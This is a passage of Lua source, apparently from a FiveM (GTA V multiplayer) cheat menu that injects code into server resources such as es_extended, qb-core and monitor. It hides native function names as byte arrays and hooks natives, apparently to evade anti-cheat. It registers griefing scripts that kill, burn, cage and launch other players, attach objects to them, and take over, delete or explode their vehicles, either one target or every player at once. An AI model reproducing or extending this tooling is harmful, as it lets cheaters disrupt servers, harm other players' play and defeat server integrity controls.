                                            _G.rcCarControlSpeed = math.max(_G.rcCarControlSpeed - deceleration, targetSpeed)
                                        end
                                    else
                                        if _G.rcCarControlSpeed > targetSpeed then
                                            _G.rcCarControlSpeed = math.max(_G.rcCarControlSpeed - deceleration, targetSpeed)
                                        elseif _G.rcCarControlSpeed < targetSpeed then
                                            _G.rcCarControlSpeed = math.min(_G.rcCarControlSpeed + acceleration, targetSpeed)
                                        end
                                    end
                                    g(nativeNames.SetVehicleForwardSpeed)(_G.rcCarControl, _G.rcCarControlSpeed)
                                    if steer ~= 0.0 and math.abs(_G.rcCarControlSpeed) > 1.0 then
                                        local speedFactor = math.min(math.abs(_G.rcCarControlSpeed) / 20.0, 1.0)
                                        local turnAmount = steer * speedFactor * 4.5
                                        g(nativeNames.SetEntityHeading)(_G.rcCarControl, vehicleHeading + turnAmount)
                                    elseif steer ~= 0.0 then
                                        local turnAmount = steer * 2.0
                                        g(nativeNames.SetEntityHeading)(_G.rcCarControl, vehicleHeading + turnAmount)
                                    end
                                else
                                    if math.abs(_G.rcCarControlSpeed) > 0.1 then
                                        if _G.rcCarControlSpeed > 0 then
                                            _G.rcCarControlSpeed = math.max(_G.rcCarControlSpeed - deceleration, 0.0)
                                        else
                                            _G.rcCarControlSpeed = math.min(_G.rcCarControlSpeed + deceleration, 0.0)
                                        end
                                        g(nativeNames.SetVehicleForwardSpeed)(_G.rcCarControl, _G.rcCarControlSpeed)
                                    else
                                        _G.rcCarControlSpeed = 0.0
                                    end
                                end
                                local vehicleCoords = g(nativeNames.GetEntityCoords)(_G.rcCarControl)
                                local found, groundZ = g(nativeNames.GetGroundZFor_3dCoord)(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 10.0, 0.0, false)
                                if found then
                                    local heightAboveGround = vehicleCoords.z - groundZ
                                    if heightAboveGround > 1.5 then
                                        local velocity = g(nativeNames.GetEntityVelocity)(_G.rcCarControl)
                                        local downwardForce = math.min((heightAboveGround - 1.5) * 2.0, 10.0)
                                        g(nativeNames.SetEntityVelocity)(_G.rcCarControl, velocity.x, velocity.y, velocity.z - downwardForce)
                                    end
                                    if heightAboveGround > 0.5 then
                                        g(nativeNames.SetVehicleOnGroundProperly)(_G.rcCarControl)
                                    end
                                end
                                if _G.rcCameraControl ~= nil then
                                    local camHeading = g(nativeNames.GetEntityHeading)(_G.rcCarControl)
                                    g(nativeNames.SetCamRot)(_G.rcCameraControl, -5.0, 0.0, camHeading, 2)
                                    local vehicleCoords = g(nativeNames.GetEntityCoords)(_G.rcCarControl)
                                    g(nativeNames.SetFocusPosAndVel)(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                end
                                g(nativeNames.SetTextFont)(0)
                                g(nativeNames.SetTextProportional)(1)
                                g(nativeNames.SetTextScale)(0.4, 0.4)
                                g(nativeNames.SetTextColour)(255, 255, 255, 255)
                                g(nativeNames.SetTextCentre)(true)
                                g(nativeNames.SetTextOutline)()
                                g(nativeNames.BeginTextCommandDisplayText)(decode({83,84,82,73,78,71}))
                                g(nativeNames.AddTextComponentSubstringPlayerName)("RC Control Active - Press X to Exit")
                                g(nativeNames.EndTextCommandDisplayText)(0.5, 0.95)
                                if g(nativeNames.IsControlJustPressed)(0, CONTROL_EXIT) then
                                    local vehicleCoords = nil
                                    if _G.rcCarControl ~= nil and g(nativeNames.DoesEntityExist)(_G.rcCarControl) then
                                        vehicleCoords = g(nativeNames.GetEntityCoords)(_G.rcCarControl)
                                    end
                                    if _G.rcCameraControl ~= nil then
                                        g(nativeNames.RenderScriptCams)(false, true, 1000, true, true)
                                        g(nativeNames.DestroyCam)(_G.rcCameraControl, false)
                                        _G.rcCameraControl = nil
                                    end
                                    _G.rcCarControlActive = false
                                    _G.rcCarControl = nil
                                    if _G.nexusFreecam and _G.nexusFreecam.camera then
                                        if vehicleCoords then
                                            g(nativeNames.SetCamCoord)(_G.nexusFreecam.camera, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 5.0)
                                        end
                                        g(nativeNames.SetCamActive)(_G.nexusFreecam.camera, true)
                                        g(nativeNames.RenderScriptCams)(true, true, 1000, true, true)
                                        if vehicleCoords then
                                            g(nativeNames.SetFocusPosAndVel)(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        end

        _G.nexusFreecam.ToggleCamera()
    ]], leftControl, rightControl, freecamSpeedValue)
    
    Susano.InjectResource(targetResource, code)
end

function DisableFreecam()
    local targetResource = InjectResource or "any"
    if not targetResource or targetResource == nil then
        if GetResourceState("es_extended") == "started" then
            targetResource = 'es_extended'
        elseif GetResourceState("ox_lib") == "started" then
            targetResource = 'ox_lib'
        elseif GetResourceState("qb-core") == "started" then
            targetResource = 'qb-core'
        elseif GetResourceState("oxmysql") == "started" then
            targetResource = 'oxmysql'
        elseif GetResourceState("monitor") == "started" then
            targetResource = 'monitor'
        else
            targetResource = 'any'
        end
    end
    
    local code = [[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function g(n)
            return _G[decode(n)]
        end

        local function wait(n)
            return Citizen.Wait(n)
        end

        local nativeNames = {
            CreateThread = {67,114,101,97,116,101,84,104,114,101,97,100},
            SetCamActive = {83,101,116,67,97,109,65,99,116,105,118,101},
            RenderScriptCams = {82,101,110,100,101,114,83,99,114,105,112,116,67,97,109,115},
            DestroyCam = {68,101,115,116,114,111,121,67,97,109},
            SetFocusEntity = {83,101,116,70,111,99,117,115,69,110,116,105,116,121},
            PlayerPedId = {80,108,97,121,101,114,80,101,100,73,100},
            EnableControlAction = {69,110,97,98,108,101,67,111,110,116,114,111,108,65,99,116,105,111,110}
        }

        if _G.nexusFreecam then
            _G.nexusFreecam.shutdown = true
            _G.nexusFreecam.isToggled = false
            _G.nexusFreecam.cameraReady = false
            if _G.nexusFreecam.camera then
                g(nativeNames.SetCamActive)(_G.nexusFreecam.camera, false)
                g(nativeNames.RenderScriptCams)(false, true, 500, false, false)
                g(nativeNames.DestroyCam)(_G.nexusFreecam.camera)
                _G.nexusFreecam.camera = nil
            end
            if _G.rcCarControlActive then
                if _G.rcCameraControl ~= nil then
                    g(nativeNames.RenderScriptCams)(false, true, 1000, true, true)
                    g(nativeNames.DestroyCam)(_G.rcCameraControl, false)
                    _G.rcCameraControl = nil
                end
                _G.rcCarControlActive = false
                _G.rcCarControl = nil
            end
            g(nativeNames.SetFocusEntity)(g(nativeNames.PlayerPedId)())
            g(nativeNames.EnableControlAction)(0, 14, true)
            g(nativeNames.EnableControlAction)(0, 15, true)
            g(nativeNames.EnableControlAction)(0, 16, true)
            g(nativeNames.EnableControlAction)(0, 17, true)
            g(nativeNames.CreateThread)(function()
                wait(100)
                _G.nexusFreecam = nil
            end)
        end
    ]]
    Susano.InjectResource(targetResource, code)
end

Utils.RegisterScript("enableFreecam", [[
    EnableFreecam()
]], "any")

Utils.RegisterScript("disableFreecam", [[
    DisableFreecam()
]], "any")

-- Player Interaction Scripts
Utils.RegisterScript("teleportToPlayer", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    local targetCoords = GetEntityCoords(targetPed)
    
    local ped = PlayerPedId()
    SetEntityCoordsNoOffset(ped, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
]], "any")

Utils.RegisterScript("killPlayer", [[
    local targetServerId = %s
    local me = PlayerPedId()
    local weaponHash = GetHashKey("VEHICLE_WEAPON_MULE4_MG")
    local hash = GetHashKey("WEAPON_PISTOL")
    
    GiveWeaponToPed(me, hash, 250, false, true)
    Wait(500)
    
    RequestWeaponAsset(weaponHash, 31, 26)
    while not HasWeaponAssetLoaded(weaponHash) do Wait(0) end
    
    local running = true
    while running do
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        if targetPlayer == -1 then
            running = false
            break
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if targetPed ~= 0 and DoesEntityExist(targetPed) then
            local tgtCoords = GetEntityCoords(targetPed)
            local fromX = tgtCoords.x
            local fromY = tgtCoords.y
            local fromZ = tgtCoords.z + 40.0
            local toX = tgtCoords.x
            local toY = tgtCoords.y
            local toZ = tgtCoords.z + 0.2
            
            ShootSingleBulletBetweenCoords(fromX, fromY, fromZ, toX, toY, toZ, 1, true, weaponHash, me, true, false, -1.0)
            Wait(1)
            
            local hp = GetEntityHealth(targetPed)
            if hp <= 0 then running = false end
        else
            running = false
        end
        
        Wait(10)
    end
    
    RemoveWeaponFromPed(me, hash)
]], "any")

Utils.RegisterScript("spectatePlayer", [[
    local enabled = %s
    local targetServerId = %s
    
    local function findClientIdByServerId(sid)
        local players = GetActivePlayers()
        for _, pid in ipairs(players) do
            if GetPlayerServerId(pid) == sid then
                return pid
            end
        end
        return -1
    end
    
    local function stopSpectate()
        if not _G.nexusSpectate or not _G.nexusSpectate.enabled then return end
        
        local me = PlayerPedId()
        local back = _G.nexusSpectate.back
        local heading = _G.nexusSpectate.heading
        local wasVisible = _G.nexusSpectate.wasVisible
        
        if back then RequestCollisionAtCoord(back.x, back.y, back.z) end
        NetworkSetInSpectatorMode(false, me)
        FreezeEntityPosition(me, false)
        if back then SetEntityCoords(me, back.x, back.y, back.z, false, false, false, true) end
        if heading then SetEntityHeading(me, heading) end
        SetEntityCollision(me, true, true)
        SetEntityVisible(me, wasVisible == nil and true or wasVisible)
        
        _G.nexusSpectate.enabled = false
        _G.nexusSpectate.targetSid = nil
    end
    
    local function startSpectate(targetSid)
        local me = PlayerPedId()
        local myCoords = GetEntityCoords(me)
        local myHeading = GetEntityHeading(me)
        
        if not _G.nexusSpectate then _G.nexusSpectate = {} end
        _G.nexusSpectate.back = vector3(myCoords.x, myCoords.y, myCoords.z - 1.0)
        _G.nexusSpectate.heading = myHeading
        _G.nexusSpectate.wasVisible = IsEntityVisible(me)
        _G.nexusSpectate.enabled = true
        _G.nexusSpectate.targetSid = targetSid
        
        local clientId = findClientIdByServerId(targetSid)
        local targetPed = (clientId ~= -1) and GetPlayerPed(clientId) or 0
        if clientId == -1 or targetPed == 0 then
            _G.nexusSpectate.enabled = false
            return
        end
        
        local tCoords = GetEntityCoords(targetPed)
        RequestCollisionAtCoord(tCoords.x, tCoords.y, tCoords.z)
        SetEntityVisible(me, false, false)
        SetEntityCollision(me, false, false)
        
        SetEntityCoords(me, tCoords.x, tCoords.y, tCoords.z - 8.0, false, false, false, true)
        Wait(300)
        FreezeEntityPosition(me, true)
        NetworkSetInSpectatorMode(true, targetPed)
        
        CreateThread(function()
            while _G.nexusSpectate and _G.nexusSpectate.enabled do
                local cid = findClientIdByServerId(_G.nexusSpectate.targetSid or targetSid)
                if cid == -1 then break end
                local ped = GetPlayerPed(cid)
                if not ped or ped == 0 or not DoesEntityExist(ped) then break end
                local pc = GetEntityCoords(ped)
                
                SetEntityCoords(me, pc.x, pc.y, pc.z - 8.0, false, false, false, true)
                Wait(400)
            end
            stopSpectate()
        end)
    end
    
    if enabled then
        startSpectate(targetServerId)
    else
        stopSpectate()
    end
]], "any")

Utils.RegisterScript("talkWithPlayer", [[
    local targetServerId = %s
    local originalCoords = GetEntityCoords(PlayerPedId())
    
    if _G.talkPlayerActive and _G.talkPlayerId == targetServerId then
        _G.talkPlayerActive = false
        _G.talkPlayerId = nil
        FreezeEntityPosition(PlayerPedId(), false)
        SetEntityCoordsNoOffset(PlayerPedId(), originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
    else
        _G.talkPlayerActive = true
        _G.talkPlayerId = targetServerId
        
        CreateThread(function()
            while _G.talkPlayerActive and _G.talkPlayerId == targetServerId do
                Wait(0)
                local targetPlayer = GetPlayerFromServerId(targetServerId)
                if targetPlayer ~= -1 then
                    local targetPed = GetPlayerPed(targetPlayer)
                    if targetPed and DoesEntityExist(targetPed) then
                        local coords = GetEntityCoords(targetPed)
                        local playerPed = PlayerPedId()
                        FreezeEntityPosition(playerPed, true)
                        SetEntityCoordsNoOffset(playerPed, coords.x, coords.y, coords.z - 2.0, false, false, false)
                    else
                        _G.talkPlayerActive = false
                        _G.talkPlayerId = nil
                        FreezeEntityPosition(PlayerPedId(), false)
                        SetEntityCoordsNoOffset(PlayerPedId(), originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                        break
                    end
                else
                    _G.talkPlayerActive = false
                    _G.talkPlayerId = nil
                    FreezeEntityPosition(PlayerPedId(), false)
                    SetEntityCoordsNoOffset(PlayerPedId(), originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                    break
                end
            end
        end)
    end
]], "any")

Utils.RegisterScript("sendToSky", [[
    local targetServerId = %s
    local playerPed = PlayerPedId()
    local originalCoords = GetEntityCoords(playerPed)
    
    Wait(250)
    
    GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
    
    for _, playerIdx in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(playerIdx) == targetServerId then
            local targetPed = GetPlayerPed(playerIdx)
            local targetCoords = GetEntityCoords(targetPed)
            
            local underTargetZ = targetCoords.z - 80.0
            SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, underTargetZ, false, false, false, true)
            
            Wait(500)
            TaskParachute(playerPed, false)
            
            local ticks = 0
            while not IsPedInParachuteFreeFall(playerPed) and ticks < 30 do
                Wait(100)
                ticks = ticks + 1
            end
            if IsPedInParachuteFreeFall(playerPed) then
                ApplyForceToEntity(playerPed, 1, 0.0, 0.0, 7500.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            end
            
            Wait(1000)
            SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            break
        end
    end
]], "any")

Utils.RegisterScript("glitchPlayer", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    local coords = GetEntityCoords(targetPed)
    local myPed = PlayerPedId()
    
    for i = 1, 15 do
        SetEntityCoords(myPed, coords.x, coords.y, coords.z + 0.5, false, false, false, false)
        Wait(50)
        AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
        Wait(50)
        DetachEntity(myPed, true, true)
        Wait(100)
    end
]], "any")

Utils.RegisterScript("cagePlayer", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    local coords = GetEntityCoords(targetPed)
    
    local model = "prop_gold_cont_01"
    RequestModel(model)
    while not HasModelLoaded(model) do Wait(0) end
    
    local obj = CreateObject(GetHashKey(model), coords.x, coords.y, coords.z - 1.0, true, true, false)
    if DoesEntityExist(obj) then
        NetworkRegisterEntityAsNetworked(obj)
        local netId = ObjToNet(obj)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)
        PlaceObjectOnGroundProperly(obj)
        FreezeEntityPosition(obj, true)
    end
    
    SetModelAsNoLongerNeeded(model)
]], "any")

Utils.RegisterScript("explodePlayer", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    local coords = GetEntityCoords(targetPed)
    
    local model = "prop_aircon_m_04"
    RequestModel(model)
    while not HasModelLoaded(model) do Wait(0) end
    
    local obj = CreateObjectNoOffset(model, coords.x, coords.y, coords.z - 1.0, true, true, false)
    if not DoesEntityExist(obj) then return end
    
    NetworkRegisterEntityAsNetworked(obj)
    local netId = ObjToNet(obj)
    SetNetworkIdExistsOnAllMachines(netId, true)
    SetNetworkIdCanMigrate(netId, true)
    
    PlaceObjectOnGroundProperly(obj)
    SetEntityVisible(obj, false, false)
    SetEntityCollision(obj, false, false)
    FreezeEntityPosition(obj, true)
    
    local pos = GetEntityCoords(obj)
    local fireIds = {}
    local offsets = {
        {0.0, 0.0, 0.0},
        {0.35, 0.0, 0.0},
        {-0.35, 0.0, 0.0},
        {0.0, 0.35, 0.0},
        {0.0, -0.35, 0.0},
    }
    
    for i=1, #offsets do
        local off = offsets[i]
        local id = StartScriptFire(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
        if id and id ~= -1 then
            fireIds[#fireIds+1] = id
        end
    end
    
    local entFire = StartEntityFire(obj)
    
    local timeout = GetGameTimer() + 10000
    while GetGameTimer() < timeout and DoesEntityExist(obj) do
        Wait(200)
    end
    
    for i=1, #fireIds do
        RemoveScriptFire(fireIds[i])
    end
    
    if entFire and entFire ~= -1 then
        RemoveScriptFire(entFire)
    end
    StopEntityFire(obj)
    
    if DoesEntityExist(obj) then
        DeleteObject(obj)
    end
    
    SetModelAsNoLongerNeeded(model)
]], "any")

Utils.RegisterScript("attachCarToPlayer", [[
    local targetServerId = %s
    local vehicleModel = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    local targetCoords = GetEntityCoords(targetPed)
    local targetHeading = GetEntityHeading(targetPed)
    
    if vehicleModel == nil or vehicleModel == "" then
        vehicleModel = "pounder2"
    end
    
    RequestModel(vehicleModel)
    while not HasModelLoaded(vehicleModel) do Wait(0) end
    
    local vehicle = CreateVehicle(GetHashKey(vehicleModel), targetCoords.x, targetCoords.y, targetCoords.z, targetHeading, true, true)
    if DoesEntityExist(vehicle) then
        NetworkRegisterEntityAsNetworked(vehicle)
        local netId = VehToNet(vehicle)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)
        
        Wait(500)
        
        AttachEntityToEntity(vehicle, targetPed, GetPedBoneIndex(targetPed, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
    end
    
    SetModelAsNoLongerNeeded(vehicleModel)
]], "any")

Utils.RegisterScript("glitchVehicle", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    local targetCoords = GetEntityCoords(targetPed)
    local vehicleModel = "pounder2"
    
    RequestModel(vehicleModel)
    while not HasModelLoaded(vehicleModel) do Wait(0) end
    
    local vehicle = CreateVehicle(GetHashKey(vehicleModel), targetCoords.x, targetCoords.y, targetCoords.z, 0.0, true, true)
    if DoesEntityExist(vehicle) then
        NetworkRegisterEntityAsNetworked(vehicle)
        local netId = VehToNet(vehicle)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)
        
        Wait(500)
        
        AttachEntityToEntity(vehicle, targetPed, GetPedBoneIndex(targetPed, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
    end
    
    SetModelAsNoLongerNeeded(vehicleModel)
]], "any")



function KickFromVehicle(targetPlayerId, delete, fuck, explode)
    if not targetPlayerId then return end
    delete = delete or false
    fuck = fuck or false
    explode = explode or false

    local function _b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return t
    end

    local function _d(tbl)
        local s = ""
        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
        return s
    end

    local function _g(n)
        local k = _d(n)
        local f = _G[k]
        return f
    end

    local kickPly = function(id, deleting, fuck, explode)
        Susano.InjectResource("any", ([[

                function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityOwner", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end

            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end

            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            Citizen.CreateThread(function()
                local player = _g(_b("PlayerPedId"))()
                SetEntityInvincible(player, true)
                local originalPos = _g(_b("GetEntityCoords"))(player)
                local originalHeading = _g(_b("GetEntityHeading"))(player)

                local driver = _g(_b("GetPlayerPed"))(%s)
                local veh = _g(_b("GetVehiclePedIsIn"))(driver, false)
                SetEntityCollision(player, false, false)
                local delete = %s
                local fuck = %s

                if veh ~= 0 and _g(_b("IsPedInAnyVehicle"))(driver, false) then
                    _g(_b("SetEntityVisible"))(player, false, false)

                    for attempt = 1, 5 do
                        local driverPos = _g(_b("GetEntityCoords"))(driver)
                        local vehPos = _g(_b("GetEntityCoords"))(veh)

                        _g(_b("SetEntityCoordsNoOffset"))(player, driverPos.x, driverPos.y, driverPos.z, false, false, true)
                        _g(_b("Wait"))(50)

                        _g(_b("SetEntityCoordsNoOffset"))(player, vehPos.x, vehPos.y, vehPos.z, false, false, true)
                        _g(_b("Wait"))(50)

                        _g(_b("SetPedIntoVehicle"))(player, veh, 0)
                        _g(_b("Wait"))(100)

                        if _g(_b("IsPedInVehicle"))(player, veh, false) then
                            break
                        end

                        _g(_b("Wait"))(100)
                    end

                    _g(_b("NetworkRequestControlOfEntity"))(veh)
                    _g(_b("Wait"))(4)

                    local owner = _g(_b("NetworkGetEntityOwner"))(veh)
                    local tries = 0
                    repeat
                        owner = _g(_b("NetworkGetEntityOwner"))(veh)
                        local newVehPos = _g(_b("GetEntityCoords"))(veh)

                        _g(_b("SetEntityCoords"))(player, newVehPos.x, newVehPos.y, newVehPos.z, false, false, true)
                        _g(_b("Wait"))(25)

                        if not _g(_b("IsPedInVehicle"))(player, veh, false) then
                            _g(_b("SetPedIntoVehicle"))(player, veh, 0)
                            _g(_b("Wait"))(25)
                        end

                        _g(_b("DeletePed"))(driver)
                        _g(_b("NetworkRequestControlOfEntity"))(veh)
                        _g(_b("SetPedIntoVehicle"))(_g(_b("PlayerPedId"))(), veh, -1)
                        _g(_b("Wait"))(30)

                        local updatedVehPos = _g(_b("GetEntityCoords"))(veh)
                        _g(_b("SetEntityCoordsNoOffset"))(player, updatedVehPos.x, updatedVehPos.y, updatedVehPos.z, false, false, true)
                        _g(_b("SetPedIntoVehicle"))(_g(_b("PlayerPedId"))(), veh, 0)
                        _g(_b("NetworkRequestControlOfEntity"))(veh)
                        _g(_b("Wait"))(30)
                        _g(_b("SetPedIntoVehicle"))(_g(_b("PlayerPedId"))(), veh, -1)
                        _g(_b("Wait"))(30)
                        tries = tries + 1
                    until owner == _g(_b("PlayerId"))() or tries == 20

                    _g(_b("Wait"))(50)
                    _g(_b("ClearPedTasksImmediately"))(_g(_b("PlayerPedId"))())
                    _g(_b("Wait"))(50)

                    if delete then
                        _g(_b("NetworkRequestControlOfEntity"))(veh)
                        _g(_b("Wait"))(100)
                        for i = 1, 5 do
                            _g(_b("SetEntityAsMissionEntity"))(veh, true, true)
                            _g(_b("DeleteEntity"))(veh)
                            _g(_b("DeleteVehicle"))(veh)
                            _g(_b("Wait"))(50)
                        end
                    end

                    for i = 1, 10 do
                        _g(_b("SetEntityCoordsNoOffset"))(player, originalPos.x, originalPos.y, originalPos.z, false, false, true)
                        _g(_b("Wait"))(10)
                    end

                    SetEntityInvincible(player, false)

                    _g(_b("SetEntityCollision"))(player, true, false)
                    _g(_b("SetEntityVisible"))(player, true, false)

                    Wait(100)

                    if explode then
                        while not _g(_b("NetworkGetEntityOwner"))(veh) == _g(_b("PlayerId"))() do
                                                    _g(_b("NetworkRequestControlOfEntity"))(veh)
                            _g(_b("Wait"))(10)
                        end
                        Wait(100)
                        _g(_b("NetworkExplodeVehicle"))(veh, true, false, false)
                    end

                    if fuck then
                        _g(_b("NetworkRequestControlOfEntity"))(veh)
                        _g(_b("Wait"))(100)

                        for i = 0, 7 do
                            _g(_b("SetVehicleTyreBurst"))(veh, i, true, 1000.0)
                        end

                        _g(_b("SetVehicleEngineHealth"))(veh, -4000.0)

                        for i = 0, 5 do
                            _g(_b("SetVehicleDoorBroken"))(veh, i, true)
                        end

                        for i = 0, 7 do
                            _g(_b("SmashVehicleWindow"))(veh, i)
                        end

                        Wait(50)

                        local vehPos = _g(_b("GetEntityCoords"))(veh)
                        for i = 1, 4 do
                            local randomX = vehPos.x + math.random(0, 10)
                            local randomY = vehPos.y + math.random(0, 10)
                            local randomZ = vehPos.z + math.random(0, 10)
                            _g(_b("SetEntityCoordsNoOffset"))(veh, randomX, randomY, randomZ, false, false, true)
                            _g(_b("Wait"))(500)
                        end
                    end
                end
            end)
        ]]):format(id, tostring(deleting), tostring(fuck), tostring(explode)))
    end

    if targetPlayerId == -1 then
        local activePlayers = _g(_b("GetActivePlayers"))();

        for _, ply in ipairs(activePlayers) do
            if ply ~= _g(_b("PlayerId"))() then
                local isInVeh = IsPedInAnyVehicle(GetPlayerPed(ply), false)
                if isInVeh then
                    kickPly(ply, delete, fuck, explode)
                    _g(_b("Wait"))(800)
                end
            end
        end
    else
        kickPly(targetPlayerId, delete, fuck, explode)
    end
end

Utils.RegisterScript("kickFromVehicle", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    if IsPedInAnyVehicle(targetPed, false) then
        TaskLeaveVehicle(targetPed, GetVehiclePedIsIn(targetPed, false), 16)
    end
]], "any")

Utils.RegisterScript("deletePlayerVehicle", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    if IsPedInAnyVehicle(targetPed, false) then
        local vehicle = GetVehiclePedIsIn(targetPed, false)
        if DoesEntityExist(vehicle) then
            DeleteVehicle(vehicle)
            DeleteEntity(vehicle)
        end
    end
]], "any")

Utils.RegisterScript("explodePlayerVehicle", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    if IsPedInAnyVehicle(targetPed, false) then
        local vehicle = GetVehiclePedIsIn(targetPed, false)
        if DoesEntityExist(vehicle) then
            local coords = GetEntityCoords(vehicle)
            AddExplosion(coords.x, coords.y, coords.z, 1, 1.0, true, false, 0.5)
        end
    end
]], "any")

Utils.RegisterScript("attachEntityToPlayer", [[
    local targetServerId = %s
    local entityModel = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    local targetCoords = GetEntityCoords(targetPed)
    
    if entityModel == "random" then
        local randomEntities = {
            "prop_cs1_14b_traind", "prop_barrier_work05", "prop_dumpster_01a",
            "prop_roadcone02a", "prop_bench_01a", "prop_parking_meter_01"
        }
        entityModel = randomEntities[math.random(1, #randomEntities)]
    end
    
    RequestModel(entityModel)
    while not HasModelLoaded(entityModel) do Wait(0) end
    
    local obj = CreateObject(GetHashKey(entityModel), targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
    if DoesEntityExist(obj) then
        NetworkRegisterEntityAsNetworked(obj)
        local netId = ObjToNet(obj)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)
        
        Wait(100)
        AttachEntityToEntity(obj, targetPed, GetPedBoneIndex(targetPed, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
    end
    
    SetModelAsNoLongerNeeded(entityModel)
]], "any")

-- Additional Player Features
Utils.RegisterScript("superJump", [[
    local toggle = %s
    
    if toggle then
